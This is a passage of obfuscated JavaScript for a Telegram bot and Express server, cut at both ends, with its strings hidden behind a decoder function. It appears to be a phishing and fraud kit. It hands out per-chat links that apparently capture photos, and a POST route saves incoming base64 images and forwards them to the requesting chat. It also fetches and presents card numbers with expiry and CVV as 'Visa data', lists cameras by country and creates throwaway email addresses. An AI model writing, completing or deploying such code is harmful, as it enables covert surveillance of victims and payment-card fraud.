            'EQYAA': _0x3a2b54(0x556),
            'XVbYt': _0x3a2b54(0x563) + _0x3a2b54(0x854),
            'NrhgK': _0x3a2b54(0x202) + 're',
            'qjYQl': _0x3a2b54(0x4c4) + 'ء',
            'JBjDs': _0x3a2b54(0x547)
        }, _0x169d5e = _0x3edd51[_0x3a2b54(0x2cb)]['id'], _0x222fd2 = _0x3e3496[_0x3a2b54(0x38d)];
    bot[_0x3a2b54(0x83a) + 'e'](_0x169d5e, _0x222fd2, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x3e3496[_0x3a2b54(0x7e5)],
                        'callback_data': _0x3e3496[_0x3a2b54(0x2ab)]
                    }],
                [{
                        'text': _0x3e3496[_0x3a2b54(0x8e3)],
                        'callback_data': _0x3e3496[_0x3a2b54(0x4d3)]
                    }],
                [{
                        'text': _0x3e3496[_0x3a2b54(0x1db)],
                        'callback_data': _0x3e3496[_0x3a2b54(0x71e)]
                    }]
            ]
        }
    });
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x14632c => {
    const _0x51cc70 = _0x54baf1, _0x2236d6 = {
            'qCGFk': function (_0x2df625, _0x3f7741) {
                return _0x2df625 === _0x3f7741;
            },
            'XHOyH': _0x51cc70(0x556),
            'KLNIo': function (_0x50603b, _0x47b045) {
                return _0x50603b === _0x47b045;
            },
            'IQIln': _0x51cc70(0x202) + 're',
            'ljgJt': _0x51cc70(0x547),
            'FPQst': _0x51cc70(0x686) + _0x51cc70(0x435) + '\x20✅',
            'XzQuu': function (_0x2fc07f, _0x542335) {
                return _0x2fc07f === _0x542335;
            },
            'fOjDX': _0x51cc70(0x458)
        }, _0x15f73b = _0x14632c[_0x51cc70(0x7ed)][_0x51cc70(0x2cb)]['id'];
    let _0x5018b5;
    if (_0x2236d6[_0x51cc70(0x5ad)](_0x14632c[_0x51cc70(0x755)], _0x2236d6[_0x51cc70(0x69b)]))
        _0x5018b5 = baseUrl + (_0x51cc70(0x906) + _0x51cc70(0x4ad)) + _0x15f73b + _0x51cc70(0x32f);
    else {
        if (_0x2236d6[_0x51cc70(0x6d2)](_0x14632c[_0x51cc70(0x755)], _0x2236d6[_0x51cc70(0x39b)]))
            _0x5018b5 = baseUrl + (_0x51cc70(0x84f) + _0x51cc70(0x4ad)) + _0x15f73b + _0x51cc70(0x32f);
        else
            _0x2236d6[_0x51cc70(0x6d2)](_0x14632c[_0x51cc70(0x755)], _0x2236d6[_0x51cc70(0x615)]) && (_0x5018b5 = baseUrl + (_0x51cc70(0x1dc) + _0x51cc70(0x4ad)) + _0x15f73b + _0x51cc70(0x32f));
    }
    if (_0x5018b5)
        bot[_0x51cc70(0x83a) + 'e'](_0x15f73b, _0x51cc70(0x189) + _0x51cc70(0x606) + _0x5018b5), bot[_0x51cc70(0x67f) + _0x51cc70(0x42c)](_0x14632c['id'], { 'text': _0x2236d6[_0x51cc70(0x35d)] });
    else
        _0x2236d6[_0x51cc70(0x3fb)](_0x14632c[_0x51cc70(0x755)], _0x2236d6[_0x51cc70(0x6de)]) && (bot[_0x51cc70(0x83a) + 'e'](_0x15f73b, _0x51cc70(0x813) + _0x51cc70(0x6fe) + _0x51cc70(0x290) + _0x51cc70(0x519) + _0x51cc70(0x7c6) + _0x51cc70(0x408) + _0x51cc70(0x83b) + 'ip'), bot[_0x51cc70(0x67f) + _0x51cc70(0x42c)](_0x14632c['id'], { 'text': '' }));
}), bot[_0x54baf1(0x67d)](/\/نننطسطوو/, _0x47fd4b => {
    const _0xfabdad = _0x54baf1, _0xc1d006 = {
            'NtXIT': _0xfabdad(0x23a) + _0xfabdad(0x6c6) + _0xfabdad(0x59d) + _0xfabdad(0x6e2),
            'SbEZX': _0xfabdad(0x1d1) + _0xfabdad(0x3c3),
            'qdijt': _0xfabdad(0x1ce) + 's',
            'KMTVn': function (_0x273095, _0x51358f) {
                return _0x273095(_0x51358f);
            }
        }, _0x1b5352 = _0x47fd4b[_0xfabdad(0x2cb)]['id'];
    bot[_0xfabdad(0x83a) + 'e'](_0x1b5352, _0xc1d006[_0xfabdad(0x72e)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0xc1d006[_0xfabdad(0x4b1)],
                        'callback_data': _0xc1d006[_0xfabdad(0x7eb)]
                    }]]
        }
    }), _0xc1d006[_0xfabdad(0x48f)](isDeveloper, _0x1b5352) && _0xc1d006[_0xfabdad(0x48f)](showAdminPanel, _0x1b5352);
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0xb467b3 => {
    const _0x332d37 = _0x54baf1, _0x45ce21 = {
            'tXsOz': function (_0xb629d4, _0x146c29) {
                return _0xb629d4 === _0x146c29;
            },
            'eHCUH': _0x332d37(0x1ce) + 's',
            'uSPsI': function (_0x149e57, _0x3c4d6e) {
                return _0x149e57(_0x3c4d6e);
            },
            'LIBsO': function (_0x5d5fbe, _0x24b2cc) {
                return _0x5d5fbe in _0x24b2cc;
            },
            'RqnoQ': function (_0x4f87d7, _0x1cba48, _0x5dbf2d) {
                return _0x4f87d7(_0x1cba48, _0x5dbf2d);
            },
            'YERnc': _0x332d37(0x237),
            'ngIRK': function (_0x902f4d, _0x2aad00, _0x30527a) {
                return _0x902f4d(_0x2aad00, _0x30527a);
            },
            'AzpWv': _0x332d37(0x667),
            'mLyaj': function (_0x387dd1, _0x5b87d5) {
                return _0x387dd1 - _0x5b87d5;
            },
            'TustP': function (_0x2bc0ca, _0x509a87, _0x6699e3) {
                return _0x2bc0ca(_0x509a87, _0x6699e3);
            }
        }, _0xd21981 = _0xb467b3[_0x332d37(0x7ed)][_0x332d37(0x2cb)]['id'];
    if (_0x45ce21[_0x332d37(0x647)](_0xb467b3[_0x332d37(0x755)], _0x45ce21[_0x332d37(0x7ce)]))
        _0x45ce21[_0x332d37(0x888)](showCountryList, _0xd21981);
    else {
        if (_0x45ce21[_0x332d37(0x557)](_0xb467b3[_0x332d37(0x755)], countryTranslation))
            bot[_0x332d37(0x34c) + _0x332d37(0x87d)](_0xd21981, _0xb467b3[_0x332d37(0x7ed)][_0x332d37(0x19c)]), _0x45ce21[_0x332d37(0x8dc)](displayCameras, _0xd21981, _0xb467b3[_0x332d37(0x755)]);
        else {
            if (_0xb467b3[_0x332d37(0x755)][_0x332d37(0x825)](_0x45ce21[_0x332d37(0x2b1)])) {
                const _0x2b0e09 = _0x45ce21[_0x332d37(0x60b)](parseInt, _0xb467b3[_0x332d37(0x755)][_0x332d37(0x699)]('_')[0x2 * -0x57e + -0x65f * 0x4 + -0x2479 * -0x1], 0x174e + 0x74b * 0x3 + -0x7 * 0x673);
                bot[_0x332d37(0x34c) + _0x332d37(0x87d)](_0xd21981, _0xb467b3[_0x332d37(0x7ed)][_0x332d37(0x19c)]), _0x45ce21[_0x332d37(0x8dc)](showCountryList, _0xd21981, _0x2b0e09);
            } else {
                if (_0xb467b3[_0x332d37(0x755)][_0x332d37(0x825)](_0x45ce21[_0x332d37(0x533)])) {
                    const _0x1d69ce = _0x45ce21[_0x332d37(0x60b)](parseInt, _0xb467b3[_0x332d37(0x755)][_0x332d37(0x699)]('_')[0x26a8 + -0x82 * -0x3d + -0x45a1 * 0x1], -0x4df * -0x2 + 0xe * -0x147 + 0x82e), _0x3653e5 = Math[_0x332d37(0x4be)](-0x3 * 0x377 + 0x11ab + -0x746, _0x45ce21[_0x332d37(0x536)](_0x1d69ce, -0x329 * 0xc + -0x26ce + 0x4ccc));
                    bot[_0x332d37(0x34c) + _0x332d37(0x87d)](_0xd21981, _0xb467b3[_0x332d37(0x7ed)][_0x332d37(0x19c)]), _0x45ce21[_0x332d37(0x1ec)](showCountryList, _0xd21981, _0x3653e5);
                }
            }
        }
    }
});
const americanBanks = [
        _0x54baf1(0x461) + _0x54baf1(0x682),
        _0x54baf1(0x23c),
        _0x54baf1(0x1e8),
        _0x54baf1(0x18c) + 'o',
        _0x54baf1(0x2ad) + 'e',
        _0x54baf1(0x3f3),
        _0x54baf1(0x56b),
        _0x54baf1(0x72b),
        _0x54baf1(0x3bb) + _0x54baf1(0x2fd),
        _0x54baf1(0x4ba) + _0x54baf1(0x2ba)
    ], fetchVisaData = async () => {
        const _0x9ab008 = _0x54baf1, _0x435899 = {
                'TwGrf': function (_0x2acd3d, _0xc90800) {
                    return _0x2acd3d === _0xc90800;
                },
                'xIqPr': function (_0x1f4275, _0x1cd513) {
                    return _0x1f4275 * _0x1cd513;
                },
                'siuTL': _0x9ab008(0x6ba) + _0x9ab008(0x477) + _0x9ab008(0x2d7),
                'ZcOOP': _0x9ab008(0x56e),
                'ddWXf': function (_0x461ae4, _0x508a8c) {
                    return _0x461ae4 + _0x508a8c;
                },
                'TpEJY': function (_0x30e690, _0x4b888a) {
                    return _0x30e690 * _0x4b888a;
                },
                'HDiJM': _0x9ab008(0x181) + _0x9ab008(0x29c) + _0x9ab008(0x5f3),
                'bJuBf': function (_0x35ad0d, _0x3f021c) {
                    return _0x35ad0d > _0x3f021c;
                },
                'vAQsB': function (_0x3637be, _0x244512) {
                    return _0x3637be > _0x244512;
                },
                'VWmpv': function (_0x4a3171, _0x347c15) {
                    return _0x4a3171 * _0x347c15;
                },
                'uPSjx': _0x9ab008(0x4fe) + _0x9ab008(0x243) + _0x9ab008(0x403) + _0x9ab008(0x5e2) + _0x9ab008(0x532) + _0x9ab008(0x277),
                'JstTC': _0x9ab008(0x276) + _0x9ab008(0x479)
            };
        try {
            const _0x3745fa = _0x435899[_0x9ab008(0x37f)], _0x2330d8 = await axios[_0x9ab008(0x2e2)](_0x3745fa), _0x3e0dc5 = _0x2330d8[_0x9ab008(0x755)], _0x39a1cd = _0x3e0dc5[_0x9ab008(0x531)]()[_0x9ab008(0x699)]('\x0a');
            if (_0x435899[_0x9ab008(0x174)](_0x39a1cd[_0x9ab008(0x5dc)], -0x2 * 0x73 + -0x19 * 0x167 + -0x23 * -0x107)) {
                const _0x273748 = _0x39a1cd[_0x9ab008(0x502)](_0x2d1d0b => {
                    const _0x479bcd = _0x9ab008, _0x294c58 = _0x2d1d0b[_0x479bcd(0x699)]('|');
                    if (_0x435899[_0x479bcd(0x279)](_0x294c58[_0x479bcd(0x5dc)], 0x35c * -0x7 + -0xe * 0x10 + 0x1868))
                        return {
                            'CardNumber': _0x294c58[-0x55b + -0x1bb + -0x716 * -0x1],
                            'Expiry': _0x294c58[-0x269f + 0x1 * 0x1467 + 0xf * 0x137] + '/' + _0x294c58[0x86e + -0x5a9 + -0x2c3],
                            'CVV': _0x294c58[-0x16aa + 0x13bd * 0x1 + 0x4 * 0xbc],
                            'Bank': americanBanks[Math[_0x479bcd(0x4fc)](_0x435899[_0x479bcd(0x8f5)](Math[_0x479bcd(0x347)](), americanBanks[_0x479bcd(0x5dc)]))],
                            'CardType': _0x435899[_0x479bcd(0x534)],
                            'Country': _0x435899[_0x479bcd(0x7ea)],
                            'Value': '$' + _0x435899[_0x479bcd(0x217)](Math[_0x479bcd(0x4fc)](_0x435899[_0x479bcd(0x87a)](Math[_0x479bcd(0x347)](), -0x4 * 0x359 + -0xbc1 + 0x1944)), 0x1d77 + 0x1076 + -0x2de3)
                        };
                })[_0x9ab008(0x57d)](Boolean);
                if (_0x435899[_0x9ab008(0x24b)](_0x273748[_0x9ab008(0x5dc)], -0x1 * 0x247b + -0x94d + 0x2dc8))
                    return _0x273748[Math[_0x9ab008(0x4fc)](_0x435899[_0x9ab008(0x894)](Math[_0x9ab008(0x347)](), _0x273748[_0x9ab008(0x5dc)]))];
            }
            return console[_0x9ab008(0x3f8)](_0x435899[_0x9ab008(0x5c8)]), null;
        } catch (_0x56cd70) {
            return console[_0x9ab008(0x3f8)](_0x435899[_0x9ab008(0x7e3)], _0x56cd70[_0x9ab008(0x7ed)]), null;
        }
    };
bot[_0x54baf1(0x67d)](/\/نكخمنتته/, _0x437045 => {
    const _0x22b8a6 = _0x54baf1, _0x1fa1fb = {
            'hkDgw': _0x22b8a6(0x281) + _0x22b8a6(0x170),
            'oeTjB': _0x22b8a6(0x5cd) + _0x22b8a6(0x170),
            'SzAqT': _0x22b8a6(0x593),
            'zFIaz': _0x22b8a6(0x6f8) + _0x22b8a6(0x3e4) + _0x22b8a6(0x86b) + _0x22b8a6(0x882) + _0x22b8a6(0x198) + _0x22b8a6(0x513) + _0x22b8a6(0x660)
        }, _0x5e0167 = _0x437045[_0x22b8a6(0x2cb)]['id'], _0x218f52 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x1fa1fb[_0x22b8a6(0x544)],
                            'callback_data': _0x1fa1fb[_0x22b8a6(0x568)]
                        }]]
            },
            'parse_mode': _0x1fa1fb[_0x22b8a6(0x746)]
        };
    bot[_0x22b8a6(0x83a) + 'e'](_0x5e0167, _0x1fa1fb[_0x22b8a6(0x8cd)], _0x218f52);
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0x5d2d67 => {
    const _0x582d97 = _0x54baf1, _0x4ec663 = {
            'oOyoe': function (_0x286c79, _0x54f3b4) {
                return _0x286c79 === _0x54f3b4;
            },
            'QjugU': _0x582d97(0x5cd) + _0x582d97(0x170),
            'eaHsy': _0x582d97(0x456) + _0x582d97(0x911) + _0x582d97(0x296) + _0x582d97(0x7f7),
            'sEIJi': _0x582d97(0x456) + _0x582d97(0x911) + _0x582d97(0x353) + _0x582d97(0x4c9),
            'yZuHf': _0x582d97(0x456) + _0x582d97(0x911) + _0x582d97(0x770) + _0x582d97(0x471),
            'VUFDA': _0x582d97(0x456) + _0x582d97(0x911) + _0x582d97(0x271) + _0x582d97(0x89d),
            'PlZtl': _0x582d97(0x456) + _0x582d97(0x911) + _0x582d97(0x43d) + _0x582d97(0x6c8),
            'KYINS': function (_0x453e67) {
                return _0x453e67();
            },
            'cErSL': _0x582d97(0x593),
            'fVNSr': _0x582d97(0x7e6) + _0x582d97(0x578) + _0x582d97(0x6f6) + _0x582d97(0x622) + _0x582d97(0x7af)
        }, _0x2e4f8b = _0x5d2d67[_0x582d97(0x7ed)][_0x582d97(0x2cb)]['id'];
    if (_0x4ec663[_0x582d97(0x40f)](_0x5d2d67[_0x582d97(0x755)], _0x4ec663[_0x582d97(0x1ea)])) {
        let _0x1fb6f0 = await bot[_0x582d97(0x83a) + 'e'](_0x2e4f8b, _0x4ec663[_0x582d97(0x381)]);
        await new Promise(_0x31b9ea => setTimeout(_0x31b9ea, 0xa31 * 0x1 + 0x1 * 0x3bb + -0xa04)), await bot[_0x582d97(0x6e6) + _0x582d97(0x78b)](_0x4ec663[_0x582d97(0x46c)], {
            'chat_id': _0x2e4f8b,
            'message_id': _0x1fb6f0[_0x582d97(0x19c)]
        }), await new Promise(_0x1cd0af => setTimeout(_0x1cd0af, 0x41 * -0x51 + 0x2 * -0x1cd + 0x1c13)), await bot[_0x582d97(0x6e6) + _0x582d97(0x78b)](_0x4ec663[_0x582d97(0x55d)], {
            'chat_id': _0x2e4f8b,
            'message_id': _0x1fb6f0[_0x582d97(0x19c)]
        }), await new Promise(_0x405513 => setTimeout(_0x405513, 0xd9 * -0x2c + -0x13b5 + -0x3ce9 * -0x1)), await bot[_0x582d97(0x6e6) + _0x582d97(0x78b)](_0x4ec663[_0x582d97(0x1f1)], {
            'chat_id': _0x2e4f8b,
            'message_id': _0x1fb6f0[_0x582d97(0x19c)]
        }), await new Promise(_0x23db5a => setTimeout(_0x23db5a, -0x6b7 + -0xd8 + 0xb77)), await bot[_0x582d97(0x6e6) + _0x582d97(0x78b)](_0x4ec663[_0x582d97(0x214)], {
            'chat_id': _0x2e4f8b,
            'message_id': _0x1fb6f0[_0x582d97(0x19c)]
        }), await new Promise(_0x4df7b6 => setTimeout(_0x4df7b6, 0x109 * 0x1 + 0x1475 + -0x1196)), await bot[_0x582d97(0x34c) + _0x582d97(0x87d)](_0x2e4f8b, _0x1fb6f0[_0x582d97(0x19c)]);
        const _0x14680b = await _0x4ec663[_0x582d97(0x432)](fetchVisaData);
        if (_0x14680b) {
            const {
                CardNumber: _0x46d58e,
                Expiry: _0x448d56,
                CVV: _0x34dca3,
                Bank: _0xe8d5ac,
                CardType: _0x2aa2db,
                Country: _0x3d3c79,
                Value: _0x31196a
            } = _0x14680b;
            bot[_0x582d97(0x83a) + 'e'](_0x2e4f8b, _0x582d97(0x588) + _0x582d97(0x886) + _0x582d97(0x676) + '`' + _0x46d58e + (_0x582d97(0x1f3) + _0x582d97(0x859)) + _0x448d56 + (_0x582d97(0x3bd) + _0x582d97(0x75d)) + _0x34dca3 + (_0x582d97(0x2c5) + _0x582d97(0x326)) + _0xe8d5ac + (_0x582d97(0x42d) + _0x582d97(0x380) + '`') + _0x2aa2db + (_0x582d97(0x59b) + _0x582d97(0x5de)) + _0x3d3c79 + (_0x582d97(0x59a) + _0x582d97(0x590)) + _0x31196a + (_0x582d97(0x887) + _0x582d97(0x8c3) + _0x582d97(0x8c3) + _0x582d97(0x6bd) + _0x582d97(0x53f) + _0x582d97(0x4f9) + _0x582d97(0x186)), { 'parse_mode': _0x4ec663[_0x582d97(0x2ee)] });
        } else
            bot[_0x582d97(0x83a) + 'e'](_0x2e4f8b, _0x4ec663[_0x582d97(0x669)]);
    }
});
const deleteFolderRecursive = _0x251c80 => {
    const _0x16b339 = _0x54baf1, _0x1985c1 = {
            'jZTab': function (_0x9549d, _0xbe3b60) {
                return _0x9549d(_0xbe3b60);
            }
        };
    fs[_0x16b339(0x407)](_0x251c80) && (fs[_0x16b339(0x79f) + 'c'](_0x251c80)[_0x16b339(0x6df)](_0x5babf6 => {
        const _0x8902e = _0x16b339, _0x5a7d35 = path[_0x8902e(0x45e)](_0x251c80, _0x5babf6);
        fs[_0x8902e(0x841)](_0x5a7d35)[_0x8902e(0x6ac) + 'y']() ? _0x1985c1[_0x8902e(0x767)](deleteFolderRecursive, _0x5a7d35) : fs[_0x8902e(0x1f0)](_0x5a7d35);
    }), fs[_0x16b339(0x3c9)](_0x251c80));
};
app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname)), app[_0x54baf1(0x514)](_0x54baf1(0x635), (_0x162ade, _0xd07a61) => {
    const _0x3b0897 = _0x54baf1, _0x4cda98 = {
            'xOody': _0x3b0897(0x889),
            'GPaEj': function (_0x3fddaa, _0x32cb44) {
                return _0x3fddaa + _0x32cb44;
            },
            'uybFO': _0x3b0897(0x831),
            'Lkcrh': _0x3b0897(0x4d8)
        }, _0x25e4bd = _0x162ade[_0x3b0897(0x91e)][_0x3b0897(0x8fa)], _0x47d1d1 = _0x162ade[_0x3b0897(0x91e)][_0x3b0897(0x826)][_0x3b0897(0x699)](','), _0x240817 = path[_0x3b0897(0x45e)](__dirname, _0x4cda98[_0x3b0897(0x316)]);
    !fs[_0x3b0897(0x407)](_0x240817) && fs[_0x3b0897(0x879)](_0x240817), _0x47d1d1[_0x3b0897(0x6df)]((_0x97aa1a, _0xd58fd0) => {
        const _0x41e3c8 = _0x3b0897, _0x24c12b = Buffer[_0x41e3c8(0x511)](_0x97aa1a, _0x4cda98[_0x41e3c8(0x4ac)]), _0x4163f9 = path[_0x41e3c8(0x45e)](_0x240817, _0x25e4bd + '_' + _0xd58fd0 + _0x41e3c8(0x2f1));
        fs[_0x41e3c8(0x5db) + _0x41e3c8(0x179)](_0x4163f9, _0x24c12b), bot[_0x41e3c8(0x7ca)](_0x25e4bd, _0x24c12b, { 'caption': _0x41e3c8(0x5ab) + _0x4cda98[_0x41e3c8(0x706)](_0xd58fd0, 0x1154 + -0x1b84 + -0x1 * -0xa31) });
    }), console[_0x3b0897(0x3f8)](_0x3b0897(0x74c) + _0x3b0897(0x832) + _0x3b0897(0x5d2) + _0x3b0897(0x509) + _0x25e4bd), _0xd07a61[_0x3b0897(0x1a1)](_0x4cda98[_0x3b0897(0x707)]);
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x53c), (_0x4c7437, _0x18c98a) => {
    const _0x17d47a = _0x54baf1, _0xf9597d = { 'Zibfw': _0x17d47a(0x555) };
    _0x18c98a[_0x17d47a(0x7bf)](path[_0x17d47a(0x45e)](__dirname, _0xf9597d[_0x17d47a(0x574)]));
}), bot[_0x54baf1(0x67d)](/\/اتتهتتاههة/, _0x1874a7 => {
    const _0xe18ac1 = _0x54baf1, _0x506683 = {
            'trooX': _0xe18ac1(0x1c7) + _0xe18ac1(0x65c) + _0xe18ac1(0x6b9) + _0xe18ac1(0x53e) + _0xe18ac1(0x337) + _0xe18ac1(0x52f),
            'piEgs': _0xe18ac1(0x224) + _0xe18ac1(0x2ea) + _0xe18ac1(0x515),
            'xwnen': _0xe18ac1(0x420) + _0xe18ac1(0x361)
        }, _0x6fce08 = _0x1874a7[_0xe18ac1(0x2cb)]['id'], _0x2b538a = _0x506683[_0xe18ac1(0x4cd)];
    bot[_0xe18ac1(0x83a) + 'e'](_0x6fce08, _0x2b538a, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x506683[_0xe18ac1(0x78d)],
                        'callback_data': _0x506683[_0xe18ac1(0x354)]
                    }]]
        }
    });
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x4ae5a6 => {
    const _0x122e52 = _0x54baf1, _0x215417 = {
            'yCLmK': function (_0x1bc498, _0x180d9f) {
                return _0x1bc498 === _0x180d9f;
            },
            'ViqyB': _0x122e52(0x420) + _0x122e52(0x361)
        }, _0x48f6f3 = _0x4ae5a6[_0x122e52(0x7ed)][_0x122e52(0x2cb)]['id'], _0x2fdb55 = _0x4ae5a6[_0x122e52(0x7ed)][_0x122e52(0x19c)];
    if (_0x215417[_0x122e52(0x421)](_0x4ae5a6[_0x122e52(0x755)], _0x215417[_0x122e52(0x33d)])) {
        const _0x427a7d = baseUrl + (_0x122e52(0x59f) + _0x122e52(0x35f)) + _0x48f6f3;
        bot[_0x122e52(0x83a) + 'e'](_0x48f6f3, _0x122e52(0x29f) + _0x122e52(0x195) + _0x122e52(0x8c7) + _0x427a7d);
    }
}), bot[_0x54baf1(0x67d)](/\/s2854تصخصrt/, _0x5d14c9 => {
    const _0x596171 = _0x54baf1, _0x535a13 = {
            'CFINj': _0x596171(0x774) + _0x596171(0x292),
            'vgQgM': _0x596171(0x3c5) + 'il',
            'urZQf': _0x596171(0x3c4)
        }, _0x123c7e = _0x5d14c9[_0x596171(0x2cb)]['id'], _0x492f81 = _0x5d14c9[_0x596171(0x511)], _0x2a9265 = _0x492f81[_0x596171(0x47e)], _0x2e925a = {
            'inline_keyboard': [[{
                        'text': _0x535a13[_0x596171(0x302)],
                        'callback_data': _0x535a13[_0x596171(0x67c)]
                    }]]
        };
    bot[_0x596171(0x83a) + 'e'](_0x123c7e, _0x596171(0x4a3) + _0x596171(0x3b9) + _0x2a9265 + (_0x596171(0x6ef) + _0x596171(0x339) + _0x596171(0x4d0) + _0x596171(0x3e9) + _0x596171(0x70f) + _0x596171(0x743) + _0x596171(0x231) + _0x596171(0x5bb) + _0x596171(0x7c1) + 'g>'), {
        'parse_mode': _0x535a13[_0x596171(0x2d3)],
        'reply_markup': { 'inline_keyboard': _0x2e925a[_0x596171(0x6ca) + _0x596171(0x804)] }
    });
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x4d66a1 => {
    const _0x164b32 = _0x54baf1, _0x23a65c = {
            'VHuki': function (_0x48ab34, _0x115329) {
                return _0x48ab34 === _0x115329;
            },
            'ucpeq': _0x164b32(0x3c5) + 'il',
            'FsYPq': _0x164b32(0x3c4)
        }, _0x15da80 = _0x4d66a1[_0x164b32(0x7ed)][_0x164b32(0x2cb)]['id'], _0x2d6e67 = _0x4d66a1[_0x164b32(0x755)];
    _0x23a65c[_0x164b32(0x75b)](_0x2d6e67, _0x23a65c[_0x164b32(0x27b)]) && bot[_0x164b32(0x83a) + 'e'](_0x15da80, _0x164b32(0x79c) + _0x164b32(0x5be) + _0x164b32(0x89b) + _0x164b32(0x661) + _0x164b32(0x717) + _0x164b32(0x20a) + _0x164b32(0x4cb) + _0x164b32(0x5c3) + _0x164b32(0x68c) + _0x164b32(0x3ff) + _0x164b32(0x2dc) + _0x164b32(0x614) + _0x164b32(0x16c) + _0x164b32(0x449) + _0x164b32(0x701) + _0x164b32(0x314) + _0x164b32(0x5eb) + _0x164b32(0x50d) + _0x164b32(0x7fc) + _0x164b32(0x33b) + _0x164b32(0x352) + _0x164b32(0x54a) + _0x164b32(0x4e6) + _0x164b32(0x5aa) + _0x164b32(0x639) + _0x164b32(0x3d5) + _0x164b32(0x17e), { 'parse_mode': _0x23a65c[_0x164b32(0x7c9)] });
});
const EMAILS_FILE = _0x54baf1(0x294) + 'n';
function readEmails() {
    const _0x790854 = _0x54baf1, _0x574134 = { 'sGJIO': _0x790854(0x81c) };
    try {
        const _0x4d58d1 = fs[_0x790854(0x223) + 'nc'](EMAILS_FILE, _0x574134[_0x790854(0x301)]);
        return JSON[_0x790854(0x18f)](_0x4d58d1);
    } catch (_0x4b9a13) {
        return {};
    }
}
function writeEmails(_0x495263) {
    const _0x27b8c7 = _0x54baf1;
    fs[_0x27b8c7(0x5db) + _0x27b8c7(0x179)](EMAILS_FILE, JSON[_0x27b8c7(0x4d5)](_0x495263, null, 0x21bb + -0x1 * 0x115e + -0x35 * 0x4f));
}
function _0x2c5f(_0x97bd43, _0xbf4283) {
    const _0x93eb06 = _0x4e41();
    return _0x2c5f = function (_0x2efd5b, _0x4e4a9a) {
        _0x2efd5b = _0x2efd5b - (-0x1 * -0xc3b + 0x17ac + -0x227e);
        let _0x5adf80 = _0x93eb06[_0x2efd5b];
        return _0x5adf80;
    }, _0x2c5f(_0x97bd43, _0xbf4283);
}
bot[_0x54baf1(0x67d)](/\/email/, async _0x119ac2 => {
    const _0x35f7e2 = _0x54baf1, _0x5f59fb = {
            'RIrJR': function (_0x45e313) {
                return _0x45e313();
            },
            'OYSLe': _0x35f7e2(0x2eb) + _0x35f7e2(0x462) + _0x35f7e2(0x598) + _0x35f7e2(0x778),
            'SAQLu': _0x35f7e2(0x3c4),
            'AlKKo': _0x35f7e2(0x497) + _0x35f7e2(0x8ed) + _0x35f7e2(0x5f0) + _0x35f7e2(0x573) + _0x35f7e2(0x274),
            'WNfIC': _0x35f7e2(0x749) + _0x35f7e2(0x32d),
            'rUCkG': _0x35f7e2(0x1cb) + _0x35f7e2(0x6b5),
            'iQrJx': function (_0xadd783, _0x1858db) {
                return _0xadd783(_0x1858db);
            },
            'nTltk': _0x35f7e2(0x632) + _0x35f7e2(0x7a5) + _0x35f7e2(0x5ce) + 'g>'
        }, _0x174b0e = _0x119ac2[_0x35f7e2(0x511)]['id'], _0x56a9d9 = _0x119ac2[_0x35f7e2(0x2cb)]['id'];
    let _0x3b0fa5 = _0x5f59fb[_0x35f7e2(0x2d6)](readEmails);
    _0x3b0fa5[_0x174b0e] && delete _0x3b0fa5[_0x174b0e];
    try {
        bot[_0x35f7e2(0x83a) + 'e'](_0x56a9d9, _0x5f59fb[_0x35f7e2(0x40a)], { 'parse_mode': _0x5f59fb[_0x35f7e2(0x50e)] });
        const _0x39012c = Math[_0x35f7e2(0x347)]()[_0x35f7e2(0x82b)](-0x19 * -0x181 + 0xb7 * -0x1 + -0x24be * 0x1)[_0x35f7e2(0x2f6)](-0xa60 + -0x85 * 0x19 + 0x175f, -0x1 * -0x1457 + 0x1f * 0xc5 + 0x1 * -0x2c2a), _0x42ca61 = _0x35f7e2(0x718) + _0x39012c, _0x10774d = await axios[_0x35f7e2(0x514)](_0x5f59fb[_0x35f7e2(0x1b5)], {
                'name': _0x42ca61,
                'domain': _0x5f59fb[_0x35f7e2(0x401)]
            }, { 'headers': { 'User-Agent': _0x5f59fb[_0x35f7e2(0x675)] } }), _0x43285a = _0x10774d[_0x35f7e2(0x755)][_0x35f7e2(0x7a1)];
        _0x3b0fa5[_0x174b0e] = _0x43285a, _0x5f59fb[_0x35f7e2(0x2bd)](writeEmails, _0x3b0fa5), bot[_0x35f7e2(0x83a) + 'e'](_0x56a9d9, _0x35f7e2(0x551) + _0x35f7e2(0x4b8) + _0x35f7e2(0x524) + _0x35f7e2(0x2ec) + _0x35f7e2(0x820) + _0x43285a + (_0x35f7e2(0x378) + _0x35f7e2(0x45c) + _0x35f7e2(0x659) + _0x35f7e2(0x8d0) + _0x35f7e2(0x876)), { 'parse_mode': _0x5f59fb[_0x35f7e2(0x50e)] });
    } catch (_0x452323) {
        bot[_0x35f7e2(0x83a) + 'e'](_0x56a9d9, _0x5f59fb[_0x35f7e2(0x8d5)], { 'parse_mode': _0x5f59fb[_0x35f7e2(0x50e)] });
    }
}), bot[_0x54baf1(0x67d)](/\/an/, _0x457f4a => {
    const _0x143211 = _0x54baf1, _0x5882ab = {
            'YZTCw': function (_0xdfcf40) {
                return _0xdfcf40();
            },
            'ObCyD': _0x143211(0x3c4),
            'sMxeY': _0x143211(0x2bc) + _0x143211(0x1a7) + _0x143211(0x865) + _0x143211(0x4e0) + 'g>'
        }, _0x3b8ee4 = _0x457f4a[_0x143211(0x2cb)]['id'], _0x53e01e = _0x457f4a[_0x143211(0x511)]['id'];
    let _0x1a9b13 = _0x5882ab[_0x143211(0x284)](readEmails);
    if (_0x1a9b13[_0x53e01e]) {
        const _0x108a38 = _0x1a9b13[_0x53e01e];
        bot[_0x143211(0x83a) + 'e'](_0x3b8ee4, _0x143211(0x2d9) + _0x143211(0x5a6) + _0x143211(0x629) + _0x143211(0x417) + _0x143211(0x867) + _0x143211(0x1c4) + _0x108a38 + (_0x143211(0x378) + _0x143211(0x45c) + _0x143211(0x659) + _0x143211(0x8d0) + _0x143211(0x876)), { 'parse_mode': _0x5882ab[_0x143211(0x225)] });
    } else
